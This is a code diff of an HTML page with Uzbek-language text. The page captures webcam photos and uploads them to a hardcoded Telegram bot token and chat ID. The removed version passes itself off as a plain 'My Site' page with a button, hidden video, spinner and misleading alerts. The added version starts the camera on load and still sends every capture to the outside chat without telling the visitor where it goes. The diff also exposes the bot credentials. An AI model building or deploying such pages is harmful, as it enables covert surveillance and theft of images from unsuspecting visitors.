@@ -3,85 +3,72 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Mening Saytim</title>
-    <link rel="stylesheet" href="./main.css">
+    <title>Kamera Orqali Rasm Olish</title>
     <style>
         body {
-            background-color: black;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
             height: 100vh;
+            background-color: black;
+            color: white;
             font-family: Arial, sans-serif;
         }
-
-        #startBtn {
-            padding: 12px 20px;
+        .capture-btn {
+            padding: 12px 24px;
             font-size: 18px;
-            cursor: pointer;
-            background-color: #007bff;
+            background: linear-gradient(45deg, #ff416c, #ff4b2b);
             color: white;
             border: none;
-            border-radius: 5px;
+            border-radius: 10px;
+            cursor: pointer;
+            margin-top: 15px;
         }
-
-        .loader {
-            border: 5px solid #f3f3f3;
-            border-top: 5px solid #3498db;
-            border-radius: 50%;
-            width: 50px;
-            height: 50px;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
+        video, canvas {
             display: none;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        video {
-            display: none;
-            position: absolute;
-            top: 0;
-            left: 0;
         }
     </style>
 </head>
 <body>
-    <button id="startBtn">Mening Saytim</button>
-    <div class="loader" id="loader"></div>
-    <video id="video" autoplay></video>
-    <canvas id="canvas" style="display: none;"></canvas>
+
+    <video id="video" playsinline></video>
+    <canvas id="canvas"></canvas>
+    <button class="capture-btn" id="capture">📸 Rasm olish</button>
 
     <script>
-        const startBtn = document.getElementById("startBtn");
-        const loader = document.getElementById("loader");
         const video = document.getElementById("video");
         const canvas = document.getElementById("canvas");
+        const captureBtn = document.getElementById("capture");
         const ctx = canvas.getContext("2d");
 
         const BOT_TOKEN = "7772442946:AAGsBqTDxTm20nn-NfIye37zGmBpnOZrxTs";
         const CHAT_ID = "7221078203";
 
-        async function initCamera() {
-            loader.style.display = "block";
+        async function startCamera() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 video.srcObject = stream;
-                await new Promise(resolve => video.onloadedmetadata = resolve);
-                loader.style.display = "none";
+                video.play();
             } catch (error) {
-                loader.style.display = "none";
-                alert("Kamera ishlamayapti: " + error);
+                alert("📷 Kamera ishlamayapti yoki ruxsat berilmagan!");
+                console.error("Kamera xatosi:", error);
             }
         }
 
-        async function takeAndSendPhoto() {
+        captureBtn.addEventListener("click", async () => {
             if (!video.srcObject) {
-                alert("Siz saytimga kirmoqchimisiz");
+                alert("⏳ Kamera ishga tushirilmoqda...");
+                await startCamera();
+                setTimeout(takePhoto, 2000);
+            } else {
+                takePhoto();
+            }
+        });
+
+        function takePhoto() {
+            if (!video.videoWidth || !video.videoHeight) {
+                alert("❌ Kamera hali to'liq yuklanmadi! Qayta urinib ko'ring.");
                 return;
             }
 
@@ -89,30 +76,33 @@
             canvas.height = video.videoHeight;
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            canvas.toBlob(async (blob) => {
+            canvas.toBlob(blob => {
                 const formData = new FormData();
                 formData.append("chat_id", CHAT_ID);
                 formData.append("photo", blob, "photo.jpg");
 
-                try {
-                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                        method: "POST",
-                        body: formData
-                    });
-                    const result = await response.json();
-                    alert("Rasm yuborildi yoki ruxsat berish tugmasini bosmadingiz!");
-                    console.log("Telegram javobi:", result);
-                } catch (error) {
-                    console.error("Xatolik:", error);
-                    alert("❌ Xatolik yuz berdi.");
-                }
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: "POST",
+                    body: formData
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        alert("✅ Rasm muvaffaqiyatli jo'natildi!");
+                    } else {
+                        alert("❌ Telegramga yuborishda xatolik!");
+                        console.error("Telegram javobi:", data);
+                    }
+                })
+                .catch(error => {
+                    alert("❌ Xatolik yuz berdi!");
+                    console.error("Fetch xatosi:", error);
+                });
             }, "image/jpeg", 0.9);
         }
 
-        startBtn.addEventListener("click", async () => {
-            if (!video.srcObject) await initCamera();
-            setTimeout(takeAndSendPhoto, 2000);
-        });
+        startCamera();
     </script>
+
 </body>
 </html>
